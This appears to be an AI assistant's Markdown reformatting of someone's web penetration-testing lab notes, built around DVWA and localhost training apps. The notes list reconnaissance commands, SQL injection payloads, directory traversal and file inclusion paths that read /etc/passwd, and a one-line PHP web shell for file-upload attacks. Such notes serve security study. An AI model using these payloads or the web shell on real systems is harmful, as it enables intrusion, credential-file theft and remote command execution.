Here’s your data formatted into Markdown for better readability. This will display neatly on GitHub:

````markdown
# Network and Security Commands Cheat Sheet

### Host Lookup

- **host google.com** : Retrieve the IPV4 and IP address information.

---

## Website Enumeration

- **nslookup google.com**

  - Displays server address and name.

- **whois google.com**

  - Provides more detailed information about the website.

- **whatweb `<ip-address>`**

  - Fetches details about the IP address.

- **whatweb --aggression 3 -v `<ip-address>`**

  - Aggressive scan mode for detailed info.

- **whatweb --aggression 3 -v `<ip-range>` --no-errors**
  - Perform aggressive scan on an IP range without displaying errors.

---

### Finding Hidden Directories

- Use the **dirb** tool:
  ```sh
  dirb <address>
  dirb http://<ip-address> /usr/share/wordlists/dirb/common.txt
  ```
````

- **nmap -sV `<ip-address>`**

  - Fetches more details about port versions.

- **nikto -host `<ip-address>`**
  - Scan the host for vulnerabilities.
  - **nikto -host `<ip-address>` -port 8081**
    - Specify a custom port (e.g., 8081).

---

## 1. Broken Access Control

```sh
sudo docker container ps
```

#### SQL Injection Example

- **Basic payload**: `' OR 1=1 #`
- **To extract passwords**: `' UNION SELECT user, password FROM users #`

**DVWA Example**:

- **Low Security**:

  - Payload: `test' OR 1=1 --`
  - Example: `GET /vulnerabilities/sqli/?id=' OR 1=1 #`

- **Medium Security**:
  - Payload: `1 OR 1=1 #`
  - To extract passwords: `1 UNION SELECT user, password FROM users #`

**SecureBank SQL Injection**:

```sql
' UNION SELECT * FROM Transactions --
' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, 'string' FROM Transactions --
' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, @@version FROM Transactions --
```

---

## Directory Traversal

```sh
tar -xvf apache-tomcat-8.5.99.tar.gz
./catalina.sh run
```

### Python Virtual Environment Setup

```sh
python3 -m venv venv
. venv/bin/activate
```

**wfuzz Usage**:

```sh
wfuzz -w <wordlist> http://localhost:1337/dynamic-app1/?FUZZ=test
```

- **Example to Access Secret File**:
  ```sh
  http://localhost:1337/dynamic-app1/?file=../../../secret.txt
  ```

---

## 2. File Inclusion Vulnerabilities

```sh
/app?page=main&username=<username>
```

#### Local File Inclusion (LFI) Example

- **Low Security**:

  ```sh
  http://localhost/vulnerabilities/fi/?page=../../../../../../../../../etc/passwd
  ```

- **Medium Security**:

  ```sh
  http://localhost/vulnerabilities/fi/?page=....//....//....//etc/passwd
  ```

- **Hard Security**:
  ```sh
  http://localhost/vulnerabilities/fi/?page=file4.php../../../../etc/passwd
  ```

#### PHP Filter

- **Base64 Encoding for Low Security**:
  ```sh
  http://localhost/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
  ```

---

## 3. File Upload Vulnerabilities

### Basic File Server Setup

```sh
cd <www-directory>
php -S 127.0.0.1:7070
touch hello.php
echo "<?php echo 'hello world'; ?>" > hello.php
```

- **Basic Exploit**:
  - Upload `shell.php` with content:
    ```php
    <?php system($_REQUEST['cmd']); ?>
    ```
  - Access with URL: `http://localhost:7070/uploads/level1-thumbnail.php?cmd=whoami`

---

Enjoy exploring, and remember to use these commands responsibly!

```

---

This Markdown file will display as organized sections with clear headings and code blocks, making it easy to read on GitHub! Let me know if you'd like any further customization.
```
